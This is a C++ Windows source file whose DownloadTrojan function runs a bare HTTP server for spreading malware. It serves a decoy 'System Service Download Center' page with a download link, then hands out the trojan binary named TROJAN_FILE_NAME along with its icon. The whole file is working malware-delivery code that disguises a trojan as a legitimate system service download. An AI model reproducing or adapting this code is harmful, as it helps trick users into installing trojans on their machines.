
#include <Windows.h>
#include "public.h"
#include "main.h"
#include "DownloadTrojanrecver.h"


DWORD __stdcall DownloadTrojan(LPNETWORKPROCPARAM lpparam) {
	NETWORKPROCPARAM stparam = *lpparam;
	char lpdata[0x1000] = { 0 };
	char szsendbuf[0x1000];

	try {

		int dwPackSize = recv(stparam.hSockClient, lpdata, 0x1000, 0);
		if (dwPackSize <= 0) {
			WriteLog("DownloadTrojan recv first packet error\r\n");
			closesocket(stparam.hSockClient);
			return FALSE;
		}

		int size = 0;
		char szgetformat[] = "GET /%s";
		char szapkico[] = "GET /favicon.ico";
		char szgetapk[MAX_PATH];
		wsprintfA(szgetapk, szgetformat, TROJAN_FILE_NAME);

		char szhttpechohdrText[] =
			"HTTP/1.1 200 OK\r\n"
			//"User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\r\n"
			"Content-type: text/html;charset=UTF-8;q=0.8\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		char szhttpechohdrApp[] =
			"HTTP/1.1 200 OK\r\n"
			"Content-type: application/octet-stream;charset=utf-8;q=0.8\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		char szhttpechohdrPhoto[] =
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: image/jpeg\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		char szhttpechohdrMedia[] =
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: audio/mp3\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		if (memcmp(lpdata, "GET / ", 6) == 0)
		{
			char szhtmlFormat[] =
				"<html>\r\n"
				"<head>\r\n"
				"<title>%s</title>\r\n"
				"</head>\r\n"
				"<body style=\"background-color: #fff0f0\">\r\n"				// background=\"image/%s\"
				"<p><font size=\"%s\" color=\"%s\">%s</font></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p><b><i><a href=\"%s\" download=\"%s\"><font size=\"%s\" color=\"%s\">%s</font></a></i></b></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				//"<p><img src=\"%s\" width=\"100%\" height=\"100%\" alt=\"\"/></p>\r\n"
	// 			"<audio controls=\"controls\" hidden=\"hidden\" autoplay=\"autoplay\" loop=\"loop\">\r\n"
	// 			"<source src=\"%s\" type=\"audio/mpeg\"/>\r\n"
	// 			"</audio>\r\n"
	// 			"<audio autoplay=\"autoplay\">\r\n"
	// 			"<source src=\"%s\" type=\"audio/mpeg\">\r\n"
	// 			"</audio>\r\n"
				"</body>\r\n"
				"</html>\r\n";

			char szBodyFontSize[] = "10";
			char szDownloadFontSize[] = "10";
			char szBodyTextColor[] = "black";
			char szDownloadColor[] = "green";

			char szTitleText[] = "System Service Download Center";
			char szBodyText[] = "System Service";
			char szDownloadTextGBK[] = "程序下载";

			char* szDownloadTextUTF8 = 0;
			int utf8len = GBKToUTF8(szDownloadTextGBK, &szDownloadTextUTF8);


			char szhtml[1024];
			int htmllen = wsprintfA(szhtml, szhtmlFormat,
				szTitleText,
				szBodyFontSize, szBodyTextColor, szBodyText,
				TROJAN_FILE_NAME, TROJAN_FILE_NAME, szDownloadFontSize, szDownloadColor, szDownloadTextUTF8);


			int sendlen = wsprintfA(szsendbuf, szhttpechohdrText, htmllen);
			memmove(szsendbuf + sendlen, szhtml, htmllen);
			sendlen += htmllen;

			size = send(stparam.hSockClient, szsendbuf, sendlen, 0);
			closesocket(stparam.hSockClient);
			if (size <= 0)
			{
				return FALSE;
			}
			else {
				return TRUE;
			}
		}
		else if (memcmp(lpdata, szapkico, lstrlenA(szapkico)) == 0)
		{
			HANDLE hFile = CreateFileA(TROJANICO_FILE_NAME, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			if (hFile == INVALID_HANDLE_VALUE) {
				closesocket(stparam.hSockClient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile, 0);
			char* szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf, szhttpechohdrPhoto, dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile, szsendbuf + sendlen, dwFileSize, &dwCnt, 0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize) {
				closesocket(stparam.hSockClient);
				delete[] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.hSockClient, szsendbuf, sendlen, 0);
			if (size <= 0)
			{
				closesocket(stparam.hSockClient);
				delete[] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.hSockClient);
			delete[] szsendbuf;
			return TRUE;
		}
		else if (memcmp(lpdata, szgetapk, lstrlenA(szgetapk)) == 0)
		{
			char szTrojanPath[MAX_PATH];
			lstrcpyA(szTrojanPath, stparam.szCurrentPath);
			lstrcatA(szTrojanPath, "\\");
			lstrcatA(szTrojanPath, TROJAN_FILE_NAME);
			HANDLE hFile = CreateFileA(szTrojanPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			if (hFile == INVALID_HANDLE_VALUE) {
				closesocket(stparam.hSockClient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile, 0);
			char* szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf, szhttpechohdrApp, dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile, szsendbuf + sendlen, dwFileSize, &dwCnt, 0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize) {
				closesocket(stparam.hSockClient);
				delete[] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.hSockClient, szsendbuf, sendlen, 0);
			if (size <= 0)
			{
				closesocket(stparam.hSockClient);
				delete[] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.hSockClient);
			delete[] szsendbuf;
			return TRUE;
		}
		else if (memcmp(lpdata, "HEAD ", 5) == 0)
		{
			char szheadurl[MAX_PATH];
			wsprintfA(szheadurl, "HEAD /%s", TROJAN_FILE_NAME);
			HANDLE hFile = INVALID_HANDLE_VALUE;
			if (memcmp(lpdata, szheadurl, lstrlenA(szheadurl)) == 0)
			{
				char szTrojanPath[MAX_PATH];
				lstrcpyA(szTrojanPath, stparam.szCurrentPath);
				lstrcatA(szTrojanPath, "\\");
				lstrcatA(szTrojanPath, TROJAN_FILE_NAME);
				hFile = CreateFileA(szTrojanPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			}
			else {
				closesocket(stparam.hSockClient);
				return TRUE;
			}

			if (hFile == INVALID_HANDLE_VALUE) {
				closesocket(stparam.hSockClient);
				return FALSE;
			}
			DWORD dwFileSize = GetFileSize(hFile, 0);
			CloseHandle(hFile);

			int sendlen = wsprintfA(szsendbuf, szhttpechohdrText, dwFileSize);

			size = send(stparam.hSockClient, szsendbuf, sendlen, 0);
			if (size <= 0)
			{
				closesocket(stparam.hSockClient);
				return FALSE;
			}
			closesocket(stparam.hSockClient);
			return TRUE;
		}
		else {
			WriteLog("DownloadApk recv unrecognized packet error\r\n");
			closesocket(stparam.hSockClient);
			return FALSE;
		}

		return TRUE;
	}
	catch (...) {
		ErrorFormat(&stparam, lpdata, "DownloadApk exception");
		WriteLog(lpdata);
		return FALSE;
	}
}
